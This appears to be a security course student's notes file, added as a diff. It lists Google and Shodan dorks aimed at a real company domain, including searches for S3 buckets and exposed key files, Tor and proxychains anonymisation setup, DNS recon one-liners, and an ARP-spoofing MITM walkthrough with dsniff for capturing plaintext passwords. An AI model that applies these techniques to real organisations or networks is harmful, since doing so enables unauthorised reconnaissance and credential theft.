@@ -1,0 +1,349 @@
+licious.in
+
+
+Google Dorks:
++ subdomains:
+	site:licious.in -www
+
++ s3 buckets:
+	site:.s3.amazonaws.com inurl:licious
+	site:.s3.amazonaws.com "licious"
+
+	intitle:"intitle:"Dashboard [Jenkins]"
+
+	inurl:domain.tld intitle:"index of /" "*key.pem"
+
+Shodan Dorks:
+
++ ip
++ ports
++ CVEs
++ Org
+
+Specific:
+
++ http.title:"Dashboard [Jenkins]"
+
+CLI:
+
+shodan count http.title:"Dashboard [Jenkins]"
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+filetype:
+ext:txt|php
+
+FOCA : 
+
+
+
+
+exiftool image.png
+______________________________________________________________
+
+Setup TOR to visit DARK WEB/ONION/Hide IP:
+------------------------------------------
+
+GUI : https://www.torproject.org/download/
+CLI : Service 
+
+Tor:
+----
+SOCKS	: HTTP
+SOCKS5	: HTTP/HTTPs
+
+Port : 9050
+
+
++ Install 
+_________
+# apt install tor -y
+
++ Config: [ No need to change anything ]
+_________
+# cat /etc/tor/torrc
+
++ Start the service:
+____________________
+# service tor restart
+
+To debug:
+---------
+# tor
+
++ Configure Browser:
+____________________
+Settings --> Proxy Settings
+
+HTTP proxy	127.0.0.1	9050   [ For ALL*]
+
+
+Tor HTTP Tunneling:
+-------------------
+
+# apt install privoxy -y
+
+Port number: 8118
+
+
+Config:
+_______
+# vim /etc/privoxy/config
+
+GO TO Line : 1388 & uncomment it
+
+forward-socks5t   /               127.0.0.1:9050 .
+
+:wq
+
+# service privoxy restart
+
+Configure the browser:
+
+Settings --> Proxy Settings
+
+HTTP proxy	127.0.0.1	8118   [ For ALL*]
+
+
+TO CHANGE LOCATION/IP:
+----------------------
+restart the service:
+
+# service tor restart; service privoxy restart
+
+Fix Exit Node:
+--------------
+# vim /etc/tor/torrc
+
+Go to end of the file:
+
+ExitNodes {PK}
+
+# service tor restart; service privoxy restart
+
+
+Change IP in number of sec:
+---------------------------
+# vim /etc/tor/torrc
+
+Go to end of the file:
+
+MaxCircuitDirtiness	num
+
+_____________
+Use tor with any Linux command on CLI:
+--------------------------------------
+# apt install proxychains
+
+# vim /etc/proxychains.conf
+
+Go to end of file and add:
+
+socks5 127.0.0.1 9050			#[ TOR ]
+http 127.0.0.1 8118			#[ TOR + PRIVOXY ]
+
+
+____________
+Host a webpage on .onion:
+-------------
++ Create a webserver and host a page:
+
+# mkdir DITISS
+# cat > index.html
+
+<html><body><h1>Ulalala</h1></body></html>
+
+# python3 -m http.server 80
+
+
++ Configure TOR:
+
+# vim /etc/tor/torrc
+
+
+Uncomment it:
+
+71 HiddenServiceDir /var/lib/tor/hidden_service/
+72 HiddenServicePort 80 127.0.0.1:80
+
+:wq
+
+# service tor restart
+
++ Go to:
+
+# cd /var/lib/tor/hidden_service
+
+# cat hostname
+kcjqimluonfvp4i75vslrzq4owjn3f7bgp7ox2md6o3wnc55pk6bfsid.onion
+
+______________________________
+DNS Recon/Enum:
+---------------
+name		-	ip
+ip 		- 	name
+
+RLDs [ Root Level Domain ] .
+TLDs [ Top Level Domain ] com, gov
+
+Query:
+------
+recursive query
+iterative query
+
+Answer:
+-------
+authoratative
+non-authoritative
+
+RR:
+---
+A		[ Address Record - IPv4 name -> ip ]
+PTR		[ Point to reverse - ip -> name ]
+CNAME	[ Canonical Name - Nick Name ]
+MX		[ Mail Exchange - MTA ]
+NS		[ Name Server ]
+SOA		[ Set/Start of authority ]
+TXT		[ TXT : SPF, DKIM, DMARC ]
+
+DNS Recon:
+----------
+# host -t MX domain.tld
+
+
+target : list
+
+targets.txt -> mx -> TXT -> no TXT
+
+
+one liner:
+-----
+xargs -a subs.txt -I@ -P2000 bash -c 'host -t mx "@" | grep "mail is handled by\|has an alias"| cut -d" " -f1| sort -u' | xargs -I@ -P1000 bash -c 'host -t TXT "@"| grep "no TXT record" --color=auto'
+__________________________________
+
+https://tryhackme.com/room/googledorking
+https://tryhackme.com/room/ohsint
+https://tryhackme.com/room/shodan
+__________________________________
+MITM [ Man in the middle ]
+```````````````````````````
+Attacker'IP	:	192.168.91.128
+Attacker'MAC	:	d1:6a:92
+
+Victim'IP	:	192.168.91.100
+Victim'MAC	:	41:C9:6A
+
+GW'IP	:	192.168.91.2
+GW'MAC	:	FC:6A:87
+
+
+0# Enable IP_FORWARDING:TEMP
+----------------------------
+# cat /proc/sys/net/ipv4/ip_forward
+0
+
+# echo "1" > /proc/sys/net/ipv4/ip_forward
+
+1# Victim to GW:Terminal#1
+--------------------------
+# arpspoof -i eth0 -t 192.168.91.100 192.168.91.2
+
+2# GW to Victim:Terminal#2
+--------------------------
+# arpspoof -i eth0 -t 192.168.91.2 192.168.91.100
+
+
+Sniff:
+-------
+a) URL:
+--------
+# urlsnarf -i eth0
+
+b) Plain Text Passwords [ like: ftp ... ]:
+------------------------------------------
+# dsniff -i eth0
+
+c) All the images:
+------------------
+
+# driftnet -i eth0
+
+____________
+Basic Linux:
+-------------
+
+
+Process Substitution:
+=---------------------
+piping the 'stdout' of a process into the 'stdin'to another process. But what if you need to pipe the 'stdout' to multiple commands?
+
+NOTE: Process Substitution treated as a file and it always return the file descriptor.
+
+<(cmd)
+>(cmd)
+
+To send date into process using '>' & read with '<'.
+
+It use '/dev/fd/<n> to send the result of (cmd) to another process.
+
+
+
+# seq 10 > num.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
